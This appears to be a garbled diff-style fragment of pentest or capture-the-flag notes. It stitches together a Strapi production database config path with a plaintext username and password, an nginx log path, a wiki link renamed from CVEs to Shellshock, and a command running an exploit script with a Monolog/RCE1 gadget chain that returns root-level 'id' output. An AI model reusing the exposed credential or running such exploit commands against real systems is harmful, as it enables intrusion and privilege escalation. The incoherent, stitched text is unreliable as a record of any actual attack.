@@ -13,7 +13,7 @@ in /opt/strapi/myapi/config/environments/production/database.json
   "username": "developer",                                         │
   "password": "#J!:F9Zt2u" 
   var/log/nginx/access.log 
-  [[CVEs]]
+  [[Shellshock]]
   └─$ ./exploit.py http://localhost:8888 Monolog/RCE1 id                                                                                            
   AND 
   uid=0(root) gid=0(root) groups=0(root)
